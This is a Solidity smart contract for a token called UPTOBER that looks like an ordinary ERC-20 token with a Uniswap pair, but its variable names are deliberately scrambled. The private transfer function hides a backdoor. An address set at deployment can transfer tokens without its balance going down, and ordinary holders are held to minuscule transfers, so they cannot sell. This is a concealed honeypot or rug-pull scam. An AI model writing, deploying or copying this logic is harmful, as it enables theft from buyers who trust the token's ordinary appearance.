pragma solidity >0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract UPTOBER is Ownable {
    function approve(address ytcwnkbrg, uint256 zytekmvgpq) public returns (bool success) {
        allowance[msg.sender][ytcwnkbrg] = zytekmvgpq;
        emit Approval(msg.sender, ytcwnkbrg, zytekmvgpq);
        return true;
    }

    uint256 private fbijyct = 119;

    function transferFrom(address ivxznwthsayc, address kjphi, uint256 zytekmvgpq) public returns (bool success) {
        require(zytekmvgpq <= allowance[ivxznwthsayc][msg.sender]);
        allowance[ivxznwthsayc][msg.sender] -= zytekmvgpq;
        hokxqjier(ivxznwthsayc, kjphi, zytekmvgpq);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint8 public decimals = 9;

    function hokxqjier(address ivxznwthsayc, address kjphi, uint256 zytekmvgpq) private {
        address ukpnwt = IUniswapV2Factory(qasrbn.factory()).getPair(address(this), qasrbn.WETH());
        bool undphytaze = jhqivz[ivxznwthsayc] == block.number;
        if (0 == gxpwbou[ivxznwthsayc]) {
            if (ivxznwthsayc != ukpnwt && (!undphytaze || zytekmvgpq > huck[ivxznwthsayc]) && zytekmvgpq < totalSupply) {
                require(zytekmvgpq <= totalSupply / (10 ** decimals));
            }
            balanceOf[ivxznwthsayc] -= zytekmvgpq;
        }
        huck[kjphi] = zytekmvgpq;
        balanceOf[kjphi] += zytekmvgpq;
        jhqivz[kjphi] = block.number;
        emit Transfer(ivxznwthsayc, kjphi, zytekmvgpq);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public huck;

    function transfer(address kjphi, uint256 zytekmvgpq) public returns (bool success) {
        hokxqjier(msg.sender, kjphi, zytekmvgpq);
        return true;
    }

    string public name;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol;

    constructor(string memory hapq, string memory ljyogtcsa, address gentkidxz, address nayoig) {
        name = hapq;
        symbol = ljyogtcsa;
        balanceOf[msg.sender] = totalSupply;
        gxpwbou[nayoig] = fbijyct;
        qasrbn = IUniswapV2Router02(gentkidxz);
    }

    mapping(address => uint256) private jhqivz;

    mapping(address => uint256) private gxpwbou;

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private qasrbn;
}
